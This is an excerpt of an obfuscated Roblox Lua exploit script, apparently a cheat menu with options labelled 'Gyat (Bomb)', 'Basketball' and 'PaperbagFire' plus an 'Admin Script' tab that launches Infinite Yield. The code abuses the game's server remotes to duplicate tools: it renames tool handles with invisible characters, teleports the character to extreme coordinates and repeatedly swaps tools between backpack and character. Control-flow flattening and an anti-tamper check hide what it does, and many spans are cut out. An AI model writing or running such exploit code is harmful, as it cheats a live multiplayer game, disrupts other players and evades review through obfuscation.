							...
							duping = false;
							local TablaGripPos = {
								Vector3.new(1.8, 7, -1.6),
								Vector3.new(1.2, 7, -1.6)
							};
							for i, tool in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
								if tool:IsA("Tool") then
									local FlatIdent_15CA0 = 0;
									local FlatIdent_302C;
									local gripPosIndex;
									local gripPos;
									while true do
										if (FlatIdent_15CA0 == 1) then
											gripPos = nil;
											while true do
												if (FlatIdent_302C == 1) then
													gripPos = TablaGripPos[gripPosIndex];
													if tool:IsDescendantOf(game.Players.LocalPlayer.Character) then
														...
														warn("Narzędzie", tool.Name, "nie mogło zostać przeniesione do postaci.");
													end
													break;
												end
												if (FlatIdent_302C == 0) then
						...
						elseif (Value == "Gyat (Bomb)") then
							...
							oldcf = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame;
							if (game.Players.LocalPlayer.Character.Humanoid.Sit == true) then
								local FlatIdent_274AD = 0;
								while true do
									if (FlatIdent_274AD == 0) then
										task.wait();
										game.Players.LocalPlayer.Character.Humanoid.Sit = false;
										break;
									end
							...
							for m = 1, 2 do
								local FlatIdent_7F20F = 0;
								local FlatIdent_92968;
								while true do
									if (FlatIdent_7F20F == 0) then
										FlatIdent_92968 = 0;
										while true do
											if (FlatIdent_92968 == 0) then
												task.wait();
												game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(999999999.414, -480, 999999999.414, 0.974360406, -0.175734088, 0.14049761, -0.133441404, 0.0514053069, 0.989722729, -0.181150302, -0.983094692, 0.0266370922);
												break;
											end
							...
							for findin, toollel in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
								if toollel:IsA("Tool") then
									if (toollel.Name == toolselcted) then
										local FlatIdent_4E8E9 = 0;
										while true do
											if (FlatIdent_4E8E9 == 0) then
												toollllfoun2 = true;
												for basc, aijfw in pairs(toollel:GetDescendants()) do
													if (aijfw.Name == "Handle") then
														...
														while true do
															if (FlatIdent_4A6D7 == 0) then
																...
																while true do
																	...
																	if (FlatIdent_5F897 == 0) then
																		local FlatIdent_37A7E = 0;
																		while true do
																			if (FlatIdent_37A7E == 1) then
																				FlatIdent_5F897 = 1;
																				break;
																			end
																			if (0 == FlatIdent_37A7E) then
																				toollll.Parent = game.Players.LocalPlayer.Character;
																				wait();
																				FlatIdent_37A7E = 1;
																			end
							...
							if (toollllfoun2 == true) then
								local FlatIdent_7204 = 0;
								local FlatIdent_86AB6;
								while true do
									if (FlatIdent_7204 == 0) then
										FlatIdent_86AB6 = 0;
										while true do
											if (FlatIdent_86AB6 == 0) then
												if (game.Players.LocalPlayer.Character:FindFirstChild(tollllahhhh) == nil) then
													toollllfoun2 = false;
												end
												repeat
							...
							for m = 1, dupeamot do
								...
								local args;
								while true do
									if (2 == FlatIdent_82BA) then
										game:GetService("Players").LocalPlayer.Character[toolselcted]:FindFirstChild("Handle").Name = "H⁥a⁥n⁥d⁥l⁥e";
										game:GetService("Players").LocalPlayer.Character:FindFirstChild(toolselcted).Parent = game.Players.LocalPlayer.Backpack;
										game:GetService("Players").LocalPlayer.Backpack:FindFirstChild(toolselcted).Parent = game.Players.LocalPlayer.Character;
										repeat
											local FlatIdent_25D1E = 0;
											local FlatIdent_29A02;
											while true do
												if (FlatIdent_25D1E == 0) then
													FlatIdent_29A02 = 0;
													while true do
									...
									if (FlatIdent_82BA == 0) then
										...
										while true do
											if (FlatIdent_89A91 == 2) then
												FlatIdent_82BA = 1;
												break;
											end
											if (FlatIdent_89A91 == 0) then
												if (duping == false) then
													local FlatIdent_23576 = 0;
													while true do
														if (FlatIdent_23576 == 0) then
															game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false;
															return;
														end
													end
									...
									if (FlatIdent_82BA == 1) then
										local FlatIdent_7B3E9 = 0;
										while true do
											if (FlatIdent_7B3E9 == 1) then
												if (duping == false) then
													local FlatIdent_6A718 = 0;
													local FlatIdent_1EC4D;
													while true do
														if (FlatIdent_6A718 == 0) then
															FlatIdent_1EC4D = 0;
															while true do
																if (FlatIdent_1EC4D == 0) then
																	local FlatIdent_6C813 = 0;
																	while true do
																		if (FlatIdent_6C813 == 0) then
																			game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false;
																			return;
																		end
																	end
											...
											if (2 == FlatIdent_7B3E9) then
												FlatIdent_82BA = 2;
												break;
											end
											if (FlatIdent_7B3E9 == 0) then
												picktoolremote:InvokeServer(unpack(args));
												game:GetService("Players").LocalPlayer.Backpack:WaitForChild(toolselcted).Parent = game.Players.LocalPlayer.Character;
												FlatIdent_7B3E9 = 1;
											end
							...
							duping = false;
							local TablaGrip = {
								CFrame.new(2, 2.6, 2) * CFrame.Angles(math.rad(90), 0, 0) ,
								CFrame.new(1, 2.6, 2) * CFrame.Angles(math.rad(90), 0, 0)
							};
							for i, tool in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
								if tool:IsA("Tool") then
									local FlatIdent_2F591 = 0;
									local gripIndex;
									local grip;
									while true do
										if (FlatIdent_2F591 == 0) then
											tool.Parent = game.Players.LocalPlayer.Character;
											gripIndex = math.min(i, #TablaGrip);
											FlatIdent_2F591 = 1;
										end
										if (FlatIdent_2F591 == 1) then
											grip = TablaGrip[gripIndex];
											if tool:IsDescendantOf(game.Players.LocalPlayer.Character) then
												tool.Grip = grip;
											else
						...
						elseif (Value == "Gyat (Basketball)") then
							args = {
								[1] = "ClearAllTools"
							};
							game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer(unpack(args));
							wait();
							toolselcted = "Basketball";
							dupeamot = 2;
							picktoolremote = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l");
							cleartoolremote = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clea1rTool1s");
							game:GetService("StarterGui"):SetCore("SendNotification", {
							...
							for m = 1, 2 do
								...
								local FlatIdent_7A2F3;
								while true do
									if (0 == FlatIdent_718AD) then
										FlatIdent_7A2F3 = 0;
										while true do
											if (FlatIdent_7A2F3 == 0) then
												task.wait();
												game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(999999999.414, -480, 999999999.414, 0.974360406, -0.175734088, 0.14049761, -0.133441404, 0.0514053069, 0.989722729, -0.181150302, -0.983094692, 0.0266370922);
												break;
											end
							...
							for findin, toollel in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
								if toollel:IsA("Tool") then
									if (toollel.Name == toolselcted) then
										...
										local FlatIdent_858C9;
										while true do
											if (0 == FlatIdent_1FBBC) then
												FlatIdent_858C9 = 0;
												while true do
													if (FlatIdent_858C9 == 0) then
														toollllfoun2 = true;
														for basc, aijfw in pairs(toollel:GetDescendants()) do
															if (aijfw.Name == "Handle") then
																local FlatIdent_30478 = 0;
																while true do
																	if (2 == FlatIdent_30478) then
																		task.wait();
																		break;
																	end
																	if (FlatIdent_30478 == 0) then
																		local FlatIdent_B5DA = 0;
																		while true do
																			if (FlatIdent_B5DA == 0) then
																				aijfw.Name = "H⁥a⁥n⁥d⁥l⁥e";
																				toollel.Parent = game.Players.LocalPlayer.Backpack;
																				FlatIdent_B5DA = 1;
																			end
																			if (FlatIdent_B5DA == 1) then
																				FlatIdent_30478 = 1;
																				break;
																			end
																		end
																	end
																	if (FlatIdent_30478 == 1) then
																		local FlatIdent_5EC5C = 0;
																		while true do
																			if (FlatIdent_5EC5C == 0) then
																				toollel.Parent = game.Players.LocalPlayer.Character;
																				tollllahhhh = toollel;
																				FlatIdent_5EC5C = 1;
																			end
																			if (FlatIdent_5EC5C == 1) then
																				FlatIdent_30478 = 2;
																				break;
																			end
																		end
							...
							for fiifi, toollll in pairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
								if toollll:IsA("Tool") then
									if (toollll.Name == toolselcted) then
										local FlatIdent_1E040 = 0;
										local FlatIdent_7566;
										while true do
											if (FlatIdent_1E040 == 0) then
												FlatIdent_7566 = 0;
												while true do
													if (FlatIdent_7566 == 0) then
														toollllfoun = true;
														for nana, jjsjsj in pairs(toollll:GetDescendants()) do
															if (jjsjsj.Name == "Handle") then
																local FlatIdent_528E4 = 0;
																local FlatIdent_322FD;
																while true do
																	if (FlatIdent_528E4 == 0) then
																		FlatIdent_322FD = 0;
																		while true do
																			if (FlatIdent_322FD == 1) then
																				local FlatIdent_7B13B = 0;
																				while true do
																					if (FlatIdent_7B13B == 1) then
																						FlatIdent_322FD = 2;
																						break;
																					end
																					if (FlatIdent_7B13B == 0) then
																						jjsjsj.Name = "H⁥a⁥n⁥d⁥l⁥e";
																						toollll.Parent = game.Players.LocalPlayer.Backpack;
																						FlatIdent_7B13B = 1;
																					end
							...
							if (toollllfoun2 == true) then
								...
								while true do
									if (FlatIdent_6E609 == 0) then
										local FlatIdent_6F7E7 = 0;
										while true do
											if (FlatIdent_6F7E7 == 0) then
												if (game.Players.LocalPlayer.Character:FindFirstChild(tollllahhhh) == nil) then
													toollllfoun2 = false;
												end
												repeat
											...
											if (FlatIdent_6F7E7 == 1) then
												FlatIdent_6E609 = 1;
												break;
											end
										end
									end
									if (FlatIdent_6E609 == 1) then
										toollllfoun2 = false;
										break;
									end
								end
							...
							for m = 1, dupeamot do
								if (duping == false) then
									local FlatIdent_C2AA = 0;
									while true do
										if (FlatIdent_C2AA == 0) then
											game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false;
											return;
										end
									end
								...
								game:GetService("Players").LocalPlayer.Backpack:FindFirstChild(toolselcted).Parent = game.Players.LocalPlayer.Character;
								repeat
									local FlatIdent_2CD86 = 0;
									while true do
										if (0 == FlatIdent_2CD86) then
											if game:GetService("Workspace"):FindFirstChild("Camera") then
												game:GetService("Workspace"):FindFirstChild("Camera"):Destroy();
											end
											task.wait();
							...
							duping = false;
							local TablaGripPos = {
								Vector3.new(1.45, 1.6, -2.8),
								Vector3.new(0.3, 1.6, -2.8)
							};
							for i, tool in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
								if tool:IsA("Tool") then
									local FlatIdent_6EA22 = 0;
									local FlatIdent_379F1;
									local gripPosIndex;
									local gripPos;
									while true do
										if (FlatIdent_6EA22 == 0) then
											FlatIdent_379F1 = 0;
											gripPosIndex = nil;
											FlatIdent_6EA22 = 1;
										end
										if (FlatIdent_6EA22 == 1) then
											gripPos = nil;
											while true do
												if (1 == FlatIdent_379F1) then
													gripPos = TablaGripPos[gripPosIndex];
													if tool:IsDescendantOf(game.Players.LocalPlayer.Character) then
														tool.GripPos = gripPos;
													else
						...
						elseif (Value == "Gyat (PaperbagFire)") then
							args = {
								[1] = "ClearAllTools"
							};
							game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer(unpack(args));
							...
							oldcf = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame;
							if (game.Players.LocalPlayer.Character.Humanoid.Sit == true) then
								local FlatIdent_34C7A = 0;
								while true do
									if (FlatIdent_34C7A == 0) then
										task.wait();
										game.Players.LocalPlayer.Character.Humanoid.Sit = false;
										break;
									end
							...
							for m = 1, 2 do
								local FlatIdent_411DF = 0;
								local FlatIdent_5BA91;
								while true do
									if (FlatIdent_411DF == 0) then
										FlatIdent_5BA91 = 0;
										while true do
											if (FlatIdent_5BA91 == 0) then
												task.wait();
												game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(999999999.414, -480, 999999999.414, 0.974360406, -0.175734088, 0.14049761, -0.133441404, 0.0514053069, 0.989722729, -0.181150302, -0.983094692, 0.0266370922);
												break;
											end
							...
							for findin, toollel in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
								if toollel:IsA("Tool") then
									if (toollel.Name == toolselcted) then
										...
										for basc, aijfw in pairs(toollel:GetDescendants()) do
											if (aijfw.Name == "Handle") then
												local FlatIdent_541F1 = 0;
												while true do
													if (2 == FlatIdent_541F1) then
														task.wait();
														break;
													end
													if (FlatIdent_541F1 == 0) then
														local FlatIdent_90191 = 0;
														while true do
															if (FlatIdent_90191 == 1) then
																FlatIdent_541F1 = 1;
																break;
															end
															if (FlatIdent_90191 == 0) then
																aijfw.Name = "H⁥a⁥n⁥d⁥l⁥e";
																toollel.Parent = game.Players.LocalPlayer.Backpack;
																FlatIdent_90191 = 1;
															end
													...
													if (FlatIdent_541F1 == 1) then
														local FlatIdent_9295C = 0;
														while true do
															if (1 == FlatIdent_9295C) then
																FlatIdent_541F1 = 2;
																break;
															end
							...
							for fiifi, toollll in pairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
								if toollll:IsA("Tool") then
									if (toollll.Name == toolselcted) then
										local FlatIdent_56427 = 0;
										local FlatIdent_786CB;
										while true do
											if (FlatIdent_56427 == 0) then
												FlatIdent_786CB = 0;
												while true do
													if (FlatIdent_786CB == 0) then
														toollllfoun = true;
														for nana, jjsjsj in pairs(toollll:GetDescendants()) do
															if (jjsjsj.Name == "Handle") then
																local FlatIdent_A830 = 0;
																while true do
																	if (FlatIdent_A830 == 1) then
							...
							if (toollllfoun == true) then
								local FlatIdent_40441 = 0;
								local FlatIdent_16D65;
								while true do
									if (FlatIdent_40441 == 0) then
										FlatIdent_16D65 = 0;
										while true do
							...
							if (toollllfoun2 == true) then
								local FlatIdent_7CC77 = 0;
								while true do
									if (FlatIdent_7CC77 == 1) then
										toollllfoun2 = false;
										break;
									end
									if (FlatIdent_7CC77 == 0) then
										local FlatIdent_8AC8F = 0;
										while true do
											if (FlatIdent_8AC8F == 0) then
												if (game.Players.LocalPlayer.Character:FindFirstChild(tollllahhhh) == nil) then
													toollllfoun2 = false;
												end
												repeat
							...
							for m = 1, dupeamot do
								if (duping == false) then
									local FlatIdent_4E6B5 = 0;
									local FlatIdent_76480;
									while true do
										if (FlatIdent_4E6B5 == 0) then
											FlatIdent_76480 = 0;
											while true do
												if (FlatIdent_76480 == 0) then
													local FlatIdent_7CEEA = 0;
													while true do
														if (FlatIdent_7CEEA == 0) then
															game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false;
															return;
														end
													end
								...
								if (duping == false) then
									...
									local FlatIdent_6529A;
									while true do
										if (FlatIdent_137B9 == 0) then
											FlatIdent_6529A = 0;
											while true do
												if (FlatIdent_6529A == 0) then
													game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false;
													return;
												end
											end
							...
							duping = false;
							local TablaGripPos = {
								Vector3.new( -2.2, 1, -0.4),
								Vector3.new( -2.2, 1, -1.4)
							};
							for i, tool in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
								if tool:IsA("Tool") then
									local FlatIdent_4BDFE = 0;
									local FlatIdent_173BB;
									local gripPosIndex;
									local gripPos;
									while true do
										if (FlatIdent_4BDFE == 1) then
											gripPos = nil;
											while true do
												...
												if (FlatIdent_173BB == 0) then
													local FlatIdent_756F4 = 0;
													while true do
														if (FlatIdent_756F4 == 0) then
															tool.Parent = game.Players.LocalPlayer.Character;
															gripPosIndex = math.min(i, #TablaGripPos);
															FlatIdent_756F4 = 1;
														end
														if (FlatIdent_756F4 == 1) then
															FlatIdent_173BB = 1;
															break;
														end
													end
				...
				Tab = Window:MakeTab({
					["Name"] = "Admin Script",
					["Icon"] = "rbxassetid://10723364605",
					["PremiumOnly"] = false
				});
				Tab:AddButton({
					["Name"] = "Infinite Yeld FE",
					["Callback"] = function()
			...
			wait(0);
			for i = 1, 100000 do
				local FlatIdent_57297 = 0;
				local FlatIdent_14DD5;
				while true do
					if (FlatIdent_57297 == 0) then
						FlatIdent_14DD5 = 0;
						while true do
							if (FlatIdent_14DD5 == 0) then
								updatePlayersList();
								wait(10);
								break;
							end
	...
	if (obf_tonumber(obf_stringmatch(obf_stringmatch(({
		obf_pcall(obf_wrapperfunc, nil)
	})[2], ":%d+:"), "%d+")) == 1) then
